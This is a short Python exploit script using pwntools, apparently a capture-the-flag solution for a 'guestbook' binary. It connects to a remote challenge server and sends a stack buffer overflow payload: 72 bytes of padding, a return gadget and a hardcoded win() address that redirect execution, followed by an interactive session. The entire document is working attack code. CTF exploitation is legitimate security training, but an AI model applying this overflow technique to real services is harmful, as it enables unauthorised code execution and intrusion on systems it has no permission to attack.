#!/usr/bin/env python3
from pwn import *
#context.binary = elf = ELF('./guestbook', checksec=False)

OFFSET_TO_RIP = 72
ret_gadget = 0x40101a

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13510)
p.recvuntil(b"name?\n")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    #p64(elf.sym.win),
    p64(0x0040121b), # win() address
)
p.send(payload)
p.interactive()